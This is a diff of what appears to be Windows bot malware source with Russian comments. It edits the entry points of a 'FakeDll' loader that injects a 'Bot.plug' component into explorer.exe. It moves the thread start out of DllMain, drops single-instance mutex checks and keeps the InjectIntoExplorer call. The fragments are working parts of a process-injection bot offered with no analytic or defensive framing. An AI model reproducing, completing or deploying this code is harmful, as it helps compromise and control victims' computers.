@@ -177,7 +177,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 {
-//	StartThread(ExplorerMain, NULL);
+	StartThread(ExplorerMain, NULL);
 }
 
 BOOL APIENTRY MyDllMain( HMODULE hModule,
@@ -188,7 +188,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	switch (ul_reason_for_call)
 	{
 		case DLL_PROCESS_ATTACH:
-			StartThread(ExplorerMain, NULL);
+			//StartThread(ExplorerMain, NULL);
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -203,13 +203,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
-	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug в explorer
-	// при множественном запуске FakeDll
-	HANDLE ExplorerInstanceHandle = TryCreateSingleInstance("bplfklexpl");
-
-	DLLDBG("ExplorerEntryPointFromFakeDll", "ExplorerInstanceHandle=0x%X", ExplorerInstanceHandle);
-	if (ExplorerInstanceHandle == NULL) return 0;
-
+	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
 	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
 	Start(NULL, NULL, NULL);
@@ -226,17 +220,7 @@ BOOL WINAPI StartFromFakeDll()
 
 	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
 	if (BotInstanceMutex == NULL) return FALSE;
-
-	// Если бот не запущен - закрываем мьютекс, 
-	// поскольку мы не запущены в Explorer.
-	pCloseHandle(BotInstanceMutex);
-	
-	// Пробуем захватить мьютекс для обеспечения единственного запуска FakeDll
-	// на случай, если ДЛЛ инсталирована для нескольких целевых процессов процесов.
-	HANDLE FakeDllInstanceHandle = TryCreateSingleInstance("bplfkl");
-	DLLDBG("StartFromFakeDll", "FakeDllInstanceHandle=0x%X", FakeDllInstanceHandle);
-
-	if (FakeDllInstanceHandle == NULL) return FALSE;
+	pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
 
 	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
 }
